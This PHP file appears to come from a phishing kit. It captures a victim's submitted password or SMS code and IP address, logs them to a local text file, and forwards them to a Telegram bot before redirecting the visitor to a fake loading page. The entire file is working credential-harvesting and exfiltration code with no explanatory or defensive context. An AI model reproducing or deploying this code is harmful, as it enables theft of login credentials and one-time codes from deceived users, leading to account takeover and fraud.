<?php
header('Location: loading4.php');
require 'wael.php';
require 'getdata.php';
$_SESSION["ASVA"] = true;
$password = $_POST['password'];
$text .= "SMS | ".$password." | ".$ip."
\n";
$file = fopen("robot.txt", "a");
fwrite($file, $text);
$tok=$api;
$user=$id;
$request=[
  'chat_id' => $user,
  'text' => "
".$text 
];
$request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
file_get_contents($request_url);
?>